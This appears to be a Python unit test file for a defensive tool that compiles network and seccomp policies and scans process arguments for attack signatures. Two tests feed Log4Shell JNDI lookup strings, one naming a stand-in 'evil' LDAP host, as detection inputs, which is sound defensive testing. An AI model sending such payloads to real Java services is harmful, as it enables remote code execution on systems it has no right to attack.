import unittest

from aegis.api import Aegis
from aegis.errors import PolicyError


class TestAegis(unittest.TestCase):
    def setUp(self):
        self.engine = Aegis()

    def test_load_config_example(self):
        p = self.engine.load("config.example.yaml")
        self.assertTrue(p.get("name"))
        self.assertEqual(p["target"]["process"], "java")

    def test_compile_auto_dispatches(self):
        p = self.engine.load("config.example.yaml")
        artifacts = self.engine.compile(p)
        # network -> nftables, spawn -> seccomp, plus audit
        self.assertIn("nftables", artifacts)
        self.assertIn("seccomp", artifacts)
        self.assertIn("audit", artifacts)

    def test_compile_single_backend(self):
        p = {"name": "t", "target": {"process": "*"},
             "rules": [{"type": "network", "deny": ["*"],
                        "allow": ["127.0.0.0/8"]}]}
        art = self.engine.compile(p, backend="nftables")
        self.assertIn("nftables", art)

    def test_validate_rejects_empty_rules(self):
        with self.assertRaises(PolicyError):
            self.engine.validate({"name": "x", "rules": []})

    def test_scan_detects_log4shell(self):
        dets = self.engine.scan({"cmdline": "java -jar app.jar",
                                 "argv": ["java", "-jar", "app.jar",
                                          "${jndi:ldap://evil/x}"]})
        ids = [d.signature_id for d in dets]
        self.assertIn("log4shell", ids)

    def test_recommend_returns_policy(self):
        dets = self.engine.scan({"cmdline": "java", "argv": ["java", "${jndi:ldap://x}"]})
        self.assertTrue(dets)
        policy = self.engine.recommend(dets[0])
        self.assertIn("name", policy)
        self.assertIn("rules", policy)

    def test_diff(self):
        a = {"name": "a", "rules": [{"type": "network", "deny": ["*"]}]}
        b = {"name": "b", "rules": [{"type": "network", "deny": ["*"],
                                     "allow": ["127.0.0.0/8"]}]}
        lines = self.engine.diff(a, b)
        self.assertTrue(any("allow" in ln for ln in lines))

    def test_doctor_all_green(self):
        results = self.engine.doctor()
        for k, v in results.items():
            self.assertFalse(str(v).startswith("FAIL"), f"{k}: {v}")


if __name__ == "__main__":
    unittest.main()
